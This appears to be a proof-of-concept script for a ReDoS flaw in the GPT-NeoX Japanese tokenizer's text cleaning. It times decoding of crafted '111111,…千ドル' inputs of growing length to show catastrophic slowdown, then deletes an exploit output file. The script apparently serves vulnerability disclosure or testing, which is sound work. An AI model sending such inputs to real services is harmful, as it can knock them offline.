import os
import time

from transformers import GPTNeoXJapaneseTokenizer

tokenizer = GPTNeoXJapaneseTokenizer.from_pretrained(
    "abeja/gpt-neox-japanese-2.7b",
    do_clean_text=True,
    )

for i in range(1,50):
    input_str = "111111," * i + "千ドル"
    start_time = time.time()
    gen_text = tokenizer.decode(tokenizer(input_str)["input_ids"])
    end_time = time.time()

    print(f"Execution time: {end_time - start_time:.6f} s , iteration (i={i})")

# reach here if no infinite
if os.path.exists("./exploit_output.txt"):
  os.remove("./exploit_output.txt")
else:
  print("exploit_output file does not exist")